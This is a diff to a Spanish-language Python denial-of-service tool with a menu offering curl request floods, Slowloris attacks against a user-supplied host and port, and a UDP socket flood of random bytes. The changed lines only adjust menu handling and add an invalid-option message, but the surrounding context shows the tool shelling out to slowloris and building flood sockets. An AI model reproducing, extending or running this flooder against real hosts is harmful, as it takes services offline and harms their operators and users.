@@ -29,8 +29,8 @@ print(Fore.BLUE+"██║░░██║██████╔╝░░░██
 print(Fore.BLUE+"╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝ "+Fore.RED+" ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░")
 print("~~~~~~~~~~~~~~~~~~~~~~~~~Created by:"+Creator+Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
 print("~~~~~~~~~~~~~~~~~~~~~~~~~ Version: "+Version+Fore.RED+" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
-method=int(input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"Ver mi IP\n~~~~> "))
-if method == 1:
+method=input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"Ver mi IP\n~~~~> ")
+if method == "1":
     host=input("Ingresa el IP, Host\n~~~~> ")
     treads=input("Ingresa el numero de solicitudes, default("+Fore.BLUE+"500"+Fore.WHITE+")\n~~~~> ")
     code_response=input("Codigo de respuesta https"+Fore.RED+" 404"+Fore.WHITE+"\nDeseas cambiar el codigo de respuesta"+Fore.GREEN+" y"+Fore.WHITE+"/"+Fore.RED+"n"+Fore.WHITE+"\n~~~~> ")
@@ -62,7 +62,7 @@ if method == 1:
             print("solicitudes terminadas...")
                 
                 
-if method == 2:
+elif method == "2":
     ip=input("Ingresa el IP, Host\n~~~~> ")
     port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~> ")
     HTTP_conexion=input("Ingresa la cantidad de conexiones\n~~~~> ")
@@ -79,7 +79,7 @@ if method == 2:
             system("slowloris "+ip+" -s "+HTTP_conexion+" -p "+port)
             
             
-if method == 3:
+elif method == "3":
     sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes=random._urandom(51200)
     sock_socket=socket.socket(socket.AF_INET)
@@ -96,7 +96,12 @@ if method == 3:
             
             
             
-if method == 4:
+elif method == "4":
     print("Tu direccion IP es:")
-    time.sleep(2)
+    time.sleep(1)
     system("curl ifconfig.me")
+    
+else:
+    for i in range(100):
+        time.sleep(0.002)
+        print(Fore.YELLOW+"Opcion Invalida :)")
